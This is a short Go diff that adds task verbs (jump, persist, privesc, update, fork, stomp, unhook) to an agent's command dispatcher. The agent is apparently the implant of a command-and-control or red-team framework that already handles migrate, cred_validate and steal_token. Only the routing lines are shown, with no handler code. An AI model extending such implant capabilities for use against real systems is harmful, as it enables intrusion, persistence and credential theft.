@@ -85,6 +85,20 @@ func (a *Agent) execute(t protocol.Task) (res protocol.Result) {
 		return a.pivotCloseVerb(t)
 	case "migrate":
 		return a.migrateVerb(ctx, t)
+	case "jump":
+		return a.jumpVerb(ctx, t)
+	case "persist":
+		return a.persistVerb(ctx, t)
+	case "privesc":
+		return a.privescVerb(ctx, t)
+	case "update":
+		return a.updateVerb(ctx, t)
+	case "fork":
+		return a.forkVerb(ctx, t)
+	case "stomp":
+		return a.stompVerb(ctx, t)
+	case "unhook":
+		return a.unhookVerb(ctx, t)
 	case "cred_validate":
 		return a.credValidateVerb(ctx, t)
 	case "steal_token":
